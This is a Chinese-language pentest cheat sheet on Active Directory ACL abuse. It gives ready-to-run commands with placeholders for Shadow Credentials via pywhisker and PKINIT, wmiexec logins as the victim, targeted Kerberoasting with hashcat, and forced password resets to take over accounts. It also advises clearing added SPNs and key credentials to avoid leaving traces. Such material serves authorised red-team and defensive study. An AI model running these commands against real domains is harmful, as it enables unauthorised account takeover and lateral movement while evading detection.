---
os: linux
service: AD
syntax: python3 pywhisker.py -d <DOMAIN> -u <USER> -p <PASS> --target <VICTIM> --action add
tags:
  - cmd
---

# ACL 滥用与 Shadow Credentials

## 原理
- ACL 权限：对某对象拥有的写/改权限，可被滥用来接管该对象
- Shadow Credentials：往用户 `msDS-KeyCredentialLink` 写公钥，用该密钥做 PKINIT 拿 TGT

## 权限含义速查
- `GenericAll` → 完全控制（可 reset 密码、加 SPN、写 KeyCredentialLink 等）
- `GenericWrite` → 写属性（加 SPN 做 targeted Kerberoasting、写 shadow creds）
- `WriteDacl` → 给自己加任意权限
- `WriteOwner` → 改所有者后拿完全控制
- `ForceChangePassword` → 直接改目标密码

## 前置检查 / 枚举

### BloodHound 查 Outbound Object Control
- 收集数据后在 BloodHound 里右键目标 → 「Outbound Object Control」
- 看哪些对象对你有 GenericAll / GenericWrite 等边

### PowerView 枚举 ACL
```powershell
Get-DomainObjectAcl -Identity <VICTIM> -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner'}
```

## 利用步骤

### 1. Shadow Credentials（pywhisker）
```bash
python3 pywhisker.py -d <DOMAIN> -u <USER> -p <PASS> --target <VICTIM> --action add
```
- 输出一个 `.pfx` 证书文件
- 用 PKINIT 拿 TGT：
```bash
python3 gettgtpkinit.py -cert-pfx <CERT>.pfx -pfx-pass <PASS> <DOMAIN>/<VICTIM> <VICTIM>.ccache
export KRB5CCNAME=<VICTIM>.ccache
```
- 登录：
```bash
impacket-wmiexec -k -no-pass <DOMAIN>/<VICTIM>@<DC>
```

### 2. Targeted Kerberoasting（GenericWrite 加 SPN）
```bash
# 给目标用户加 SPN
python3 targetedKerberoast.py -d <DOMAIN> -u <USER> -p <PASS> --request-user <VICTIM>
# 或 Windows:
setspn -s HTTP/<VICTIM>.<DOMAIN> <VICTIM>
# 再请求 TGS 并破解（hashcat -m 13100）
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC> -request-user <VICTIM>
```

### 3. ForceChangePassword（改密码接管）
```bash
net rpc password <VICTIM> -U <DOMAIN>/<USER>%<PASS> -S <DC>
```
或 impacket：
```bash
impacket-changepasswd <DOMAIN>/<USER>:<PASS>@<DC> -newpass <NEWPASS> -reset <VICTIM>
```

### 4. GenericAll → reset 密码接管
```bash
impacket-changepasswd <DOMAIN>/<VICTIM>:<NEWPASS>@<DC>
```

## 常见坑
- 需要目标对象属性可写；BloodHound 的「Outbound Object Control」会高亮这些边
- Shadow Credentials 需要域支持 PKINIT（默认开启）
- 加 SPN / 写 KeyCredentialLink 后记得清理，避免留痕

## 参考开源项目
- pywhisker (https://github.com/ShutdownRepo/pywhisker)
- PKINITtools (https://github.com/dirkjanm/PKINITtools)
- BloodHound (https://github.com/SpecterOps/BloodHound)
